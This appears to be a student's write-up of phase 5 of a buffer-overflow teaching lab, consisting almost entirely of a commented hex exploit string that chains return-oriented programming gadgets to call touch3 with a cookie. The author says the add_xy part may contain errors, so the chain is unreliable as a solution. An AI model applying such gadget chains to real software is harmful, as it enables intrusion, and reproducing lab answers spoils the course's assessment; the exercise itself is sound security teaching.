### **Phase 5** 

This phase was difficult for me to solve with complexity and time I had.

I believe I almost completed it but my add_xy area may have some error(s).

This is what I had 

```
/* Buffer - 24 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Move %rsp into %rax */
/* 48 89 e0 c3 */
/* 401fe7 + 3 */
ea 1f 40 00 00 00 00 00


/* Move %rax into %rdi
/* 48 89 c7 c3 */
/* 401f3e + 1 */
3f 1f 40 00 00 00 00 00


/* Pop %rax */
/* 58 */
/* 401f33 + 2 */
35 1f 40 00 00 00 00 00


/* Empty Row of Zeros */
48 00 00 00 00 00 00 00


/* Move eax into ecx */
/* 89 c1 */
/* 402072 + 1 */
73 20 40 00 00 00 00 00


/* Move ecx into edx */
/* 89 ca */
/* 4020b1 + 2 */
b3 20 40 00 00 00 00 00

/* Move edx into esi */
/* 89 d6 */
/* 401f90 + 2 */
92 1f 40 00 00 00 00 00

/* Address of add_xy */
/* 401f7c */
84 1f 40 00 00 00 00 00

/* Move %rax into %rdi */
/* Same as above */
3f 1f 40 00 00 00 00 00

/* Address of touch3 */
/* 0x401e6b */
6b 1e 40 00 00 00 00 00

/* Hex translation of cookie: 0x33f72ca5 */
33 33 66 37 32 63 61 35 00
```

Good luck.
